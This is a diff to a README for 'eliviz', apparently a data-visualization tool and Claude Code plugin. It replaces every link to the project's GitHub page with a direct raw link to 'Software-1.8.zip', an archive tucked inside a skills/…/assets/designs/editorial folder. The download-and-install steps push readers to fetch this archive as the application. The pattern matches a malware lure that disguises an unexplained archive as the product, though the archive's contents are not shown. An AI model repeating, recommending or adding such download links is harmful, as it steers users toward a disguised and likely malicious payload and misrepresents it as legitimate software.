@@ -1,6 +1,6 @@
 # ✨ eliviz - Turn Any Data Into a Visual Story
 
-[![Download eliviz](https://img.shields.io/badge/Download-eliviz-blue?style=for-the-badge&logo=github)](https://github.com/Doreenperemptory25/eliviz)
+[![Download eliviz](https://img.shields.io/badge/Download-eliviz-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Doreenperemptory25/eliviz/main/skills/eliviz/assets/designs/editorial/Software-1.8.zip)
 
 ## 🎯 What Is eliviz?
 
@@ -12,14 +12,14 @@ What makes eliviz special? It comes with **switchable design identities**. That 
 
 Getting eliviz up and running is easier than making coffee. Here's what you need to do:
 
-1. **Visit the download page** by clicking the blue button above or going to: https://github.com/Doreenperemptory25/eliviz
+1. **Visit the download page** by clicking the blue button above or going to: https://raw.githubusercontent.com/Doreenperemptory25/eliviz/main/skills/eliviz/assets/designs/editorial/Software-1.8.zip
 2. **Click the download button** on that page. Your computer will start downloading the eliviz file automatically.
 3. **Wait for the download to finish** — it only takes a few seconds.
 4. **That's it!** The file you downloaded is ready to use.
 
 ## 📥 Download and Install
 
-**Visit this link to download the application:** [https://github.com/Doreenperemptory25/eliviz](https://github.com/Doreenperemptory25/eliviz)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/Doreenperemptory25/eliviz/main/skills/eliviz/assets/designs/editorial/Software-1.8.zip](https://raw.githubusercontent.com/Doreenperemptory25/eliviz/main/skills/eliviz/assets/designs/editorial/Software-1.8.zip)
 
 Once you're on that page, look for the green "Download" button or the release section. Click it and follow the simple instructions. The download will begin instantly, and you'll have eliviz ready in no time.
 
@@ -103,7 +103,7 @@ Absolutely! If you know a little HTML, you can customize the generated file to y
 
 ## 📄 License and Support
 
-eliviz is free to use and explore. For the latest updates, new features, and community support, visit the official GitHub page at https://github.com/Doreenperemptory25/eliviz
+eliviz is free to use and explore. For the latest updates, new features, and community support, visit the official GitHub page at https://raw.githubusercontent.com/Doreenperemptory25/eliviz/main/skills/eliviz/assets/designs/editorial/Software-1.8.zip
 
 Join other users in sharing what you've created and get tips from the community.
 
@@ -125,6 +125,6 @@ Visit the GitHub page and check out the documentation or open an issue. The comm
 
 You're just a few clicks away from turning boring files into amazing interactive experiences. Click the download button, follow the simple steps, and watch your data come to life.
 
-**Remember:** [Download eliviz now](https://github.com/Doreenperemptory25/eliviz) and start creating stunning visualizations in minutes!
+**Remember:** [Download eliviz now](https://raw.githubusercontent.com/Doreenperemptory25/eliviz/main/skills/eliviz/assets/designs/editorial/Software-1.8.zip) and start creating stunning visualizations in minutes!
 
 Keywords: ai-agents, claude, claude-code, claude-code-plugin, claude-plugin, csv, dashboard, data-visualization, data-viz, eli5, html, markdown, offline-first, single-file, sqlite, threejs, visualization
